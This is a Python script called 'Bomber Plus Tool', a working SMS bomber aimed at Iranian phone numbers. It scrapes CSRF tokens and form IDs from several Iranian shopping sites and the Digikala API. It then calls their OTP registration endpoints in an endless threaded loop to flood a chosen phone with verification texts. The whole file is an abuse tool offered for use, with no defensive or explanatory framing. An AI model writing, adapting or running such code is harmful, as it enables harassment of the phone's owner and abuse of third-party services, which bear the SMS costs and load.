from platform import node, system, release
from os import system as os_system, name
from re import match, sub
from threading import Thread
import urllib3; urllib3.disable_warnings()
from time import sleep
import random
import socket

try:
    from requests import get, post
except ImportError:
    os_system("python3 -m pip install requests")

# Colors
r = '\033[31;1m'  
g = '\033[32;1m'  
y = '\033[33;1m'  
b = '\033[34;1m'  
p = '\033[35;1m'  
w = '\033[37;1m'  
a = '\033[0m'     
d = '\033[90;1m'  

# System info
Node, System, Release = node(), system(), release()

# Clear screen
os_system('clear' if name == 'posix' else 'cls')

# Slow print
def print_slow(text, delay=0.009):
    for char in text:
        print(char, end='', flush=True)
        sleep(delay)
    print()

# Check internet
def check_internet():
    try:
        socket.gethostbyname("smtp.gmail.com")
        return True
    except socket.gaierror:
        return False

# ------------------------------
# SMS services
# ------------------------------
def katonikhan(phone):
    import requests
    import re
    
    digits_phone = phone.replace("+98", "")
    formatted_phone = f"{digits_phone[:3]}+{digits_phone[3:6]}+{digits_phone[6:]}"
    
    try:
        session = requests.Session()
        home_response = session.get("https://katonikhan.com/", timeout=10)
        
        # استخراج instance_id
        instance_id = None
        instance_pattern = r'name="instance_id" value="([a-f0-9]+)"'
        match_obj = re.search(instance_pattern, home_response.text)
        if match_obj:
            instance_id = match_obj.group(1)
        if not instance_id:
            instance_id = "c1866f4215f82aaedb42ab38190ef1fa"
        
        url = "https://katonikhan.com/wp-admin/admin-ajax.php"
        payload = {
            "phone": formatted_phone,
            "digt_countrycode": "+98",
            "digits_process_register": "1",
            "instance_id": instance_id,
            "optional_data": "optional_data",
            "action": "digits_forms_ajax",
            "type": "register",
            "dig_otp": "",
            "digits": "1",
            "digits_redirect_page": "-1",
            "aio_special_field": "",
            "digits_form": "92e2d882a6",
            "_wp_http_referer": "/?login=true&page=1&redirect_to=https%3A%2F%2Fkatonikhan.com%2F"
        }
        headers = {
            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "X-Requested-With": "XMLHttpRequest",
            "Origin": "https://katonikhan.com",
            "Referer": "https://katonikhan.com/",
        }
        response = session.post(url, data=payload, headers=headers, timeout=10)
        
        print(f'{g}[+] Status: {response.status_code}{a}')
        print(f'{g}[+] Response: {response.text}{a}')
        
        if response.status_code == 200:
            try:
                response_data = response.json()
                if response_data.get("success") is True:
                    print(f'{g}(katonikhan) {a}Code Sent')
                    return True
            except:
                if "1" in response.text or "success" in response.text.lower():
                    print(f'{g}(katonikhan) {a}Code Sent')
                    return True
        
        print(f'{r}[-] (katonikhan) Failed{a}')
        return False
    except Exception as e:
        print(f'{r}[!] katonikhan Exception: {e}{a}')
        return False

def katoonistore(phone):
    import requests
    import re
    
    digits_phone = phone.replace("+98", "")
    
    try:
        session = requests.Session()
        home_response = session.get("https://katoonistore.ir/", timeout=10)
        
        instance_id = None
        instance_pattern = r'name="instance_id" value="([a-f0-9]+)"'
        match_obj = re.search(instance_pattern, home_response.text)
        if match_obj:
            instance_id = match_obj.group(1)
        if not instance_id:
            instance_id = "0ccd1ebf590232d8b06f9157a9654fa1"
        
        url = "https://katoonistore.ir/wp-admin/admin-ajax.php"
        payload = {
            "digits_reg_name": "م",
            "digt_countrycode": "+98",
            "phone": digits_phone,
            "digits_reg_تاریخ1747725841572": "",
            "jalali_digits_reg_تاریخ1747725841572463063470": "",
            "digits_process_register": "1",
            "sms_otp": "",
            "otp_step_1": "1",
            "digits_otp_field": "1",
            "instance_id": instance_id,
            "optional_data": "optional_data",
            "action": "digits_forms_ajax",
            "type": "register",
            "dig_otp": "sms_otp",
            "digits": "1",
            "digits_redirect_page": "//katoonistore.ir/?page=1&redirect_to=https%3A%2F%2Fkatoonistore.ir%2F",
            "digits_form": "d3232db853",
            "_wp_http_referer": "/?login=true&page=1&redirect_to=https%3A%2F%2Fkatoonistore.ir%2F",
            "otp_resend": "true",
            "container": "digits_protected",
            "sub_action": "sms_otp"
        }
        headers = {
            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "X-Requested-With": "XMLHttpRequest",
            "Origin": "https://katoonistore.ir",
            "Referer": "https://katoonistore.ir/",
        }
        response = session.post(url, data=payload, headers=headers, timeout=10)
        
        if response.status_code == 200:
            response_data = response.json()
            if response_data.get("success") is True:
                print(f'{g}(katoonistore) {a}Code Sent')
                return True
        
        print(f'{r}[-] (katoonistore) Failed{a}')
        return False
    except Exception:
        print(f'{r}[-] (katoonistore) Failed{a}')
        return False

def hajamooo(phone):
    import requests
    import re
    
    digits_phone = phone.replace("+98", "")
    formatted_phone = f"{digits_phone[:3]} {digits_phone[3:6]} {digits_phone[6:]}"
    
    try:
        session = requests.Session()
        home_response = session.get("https://hajamooo.ir/", timeout=10)
        
        nounce_value = None
        nounce_patterns = [
            r'name="dig_nounce" value="([a-f0-9]+)"',
            r'name="csrf" value="([a-f0-9]+)"',
            r'var nonce = "([a-f0-9]+)"',
        ]
        for pattern in nounce_patterns:
            match_obj = re.search(pattern, home_response.text)
            if match_obj:
                nounce_value = match_obj.group(1)
                break
        if not nounce_value:
            nounce_value = "34bcba36e0"
        
        url = "https://hajamooo.ir/wp-admin/admin-ajax.php"
        payload = {
            "action": "digits_check_mob",
            "countrycode": "+98",
            "mobileNo": digits_phone,
            "csrf": nounce_value,
            "login": "1",
            "username": "",
            "email": "",
            "captcha": "",
            "captcha_ses": "",
            "digits": "1",
            "json": "1",
            "whatsapp": "0",
            "mobmail": formatted_phone,
            "dig_otp": "",
            "dig_nounce": nounce_value
        }
        headers = {
            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "X-Requested-With": "XMLHttpRequest",
            "Origin": "https://hajamooo.ir",
            "Referer": "https://hajamooo.ir/",
        }
        response = session.post(url, data=payload, headers=headers, timeout=10)
        
        if response.status_code == 200:
            response_text = response.text.strip()
            if response_text == "1" or "success" in response_text.lower():
                print(f'{g}(hajamooo) {a}Code Sent')
                return True
        
        print(f'{r}[-] (hajamooo) Failed{a}')
        return False
    except Exception:
        print(f'{r}[-] (hajamooo) Failed{a}')
        return False

def digikala(phone):
    url = "https://api.digikala.com/v1/user/authenticate/"
    payload = {"username": "0" + phone.split("+98")[1]}
    try:
        response = post(url, json=payload, timeout=5)
        if response.status_code == 200:
            print(f'{g}(Digikala) {a}Code Sent')
            return True
        else:
            print(f'{r}[-] (Digikala) Failed or No Response{a}')
            return False
    except Exception as e:
        print(f'{r}[!] Digikala Exception: {e}{a}')
        return False

# Wrapper to safely run each service
def send_service_safe(service, phone):
    result = service(phone)
    if result:
        print(f"{g}[+] {service.__name__}: Code Sent!")
    else:
        print(f"{y}[-] {service.__name__}: Failed or No Response")

# Simple SMS bomber
def Vip(phone, Time):
    services = [
        digikala,
        hajamooo,
        katoonistore,
        katonikhan,
    ]
    total_services = len(services)

    print_slow(f"{p}╔═════[ SMS Bombing Initiated ]═════╗")
    print_slow(f"{g}Target: {y}{phone}")
    print_slow(f"{g}Payloads: {y}{total_services} services")
    print_slow(f"{g}Delay: {y}{Time}s")
    print_slow(f"{p}╚═══════════════════════════════════╝")
    sleep(1)

    try:
        while True:
            for service in services:
                Thread(target=send_service_safe, args=(service, phone)).start()
                sleep(Time)
    except KeyboardInterrupt:
        print_slow(f"{g}[+] {y}Mission Completed!")
        os_system('clear' if name == 'posix' else 'cls')  

# Phone validation
def is_phone(phone: str):
    if match(r"^(?:\+989|989|09|9)\d{9}$", phone):
        return sub(r"^(?:\+989|989|09|9)", "+989", phone)
    return False

# Menu
def main_menu():
    os_system('clear' if name == 'posix' else 'cls')
    print_slow(f"""
{p}╔════════════════════════════════════════════════════╗
{b}║              ⟬ Bomber Plus Tool (Fixed) ⟭          ║
{p}╚════════════════════════════════════════════════════╝
{y} System:
    {g}» Platform: {w}{System}
    {g}» Node: {w}{Node}
    {g}» Release: {w}{Release}
{p}══════════════════════════════════════════════════════
{w} Choose an Option:
    {g}[1] {y}SMS Bomber
    {g}[2] {y}Email Bomber
    {r}[0] {y}Exit
{p}══════════════════════════════════════════════════════
""")
    return input(f"{g}[?] {y}Enter Choice (0-2): {a}")

# Main loop
def main():
    while True:
        choice = main_menu()

        if choice == '1':
            print_slow(f"{g}[+] {y}Starting SMS Bomber!")
            while True:
                phone = is_phone(input(f'{g}[?] {y}Enter Phone (+98): {a}'))
                if phone:
                    break
                print(f"{r}[-] {a}Invalid Phone!")
            try:
                Time = float(input(f'{g}[?] {y}Delay (seconds) [Default=0.1]: {a}') or 0.1)
            except ValueError:
                Time = 0.1
            Vip(phone, Time)

        elif choice == '2':
            print_slow(f"{g}[+] {y}Email Bomber is not implemented in this snippet.")

        elif choice == '0':
            print_slow(f"{r}[-] {y}Exiting... Goodbye!")
            break

        else:
            print_slow(f"{r}[-] {a}Invalid Choice!")
            sleep(1)

if __name__ == "__main__":
    main()
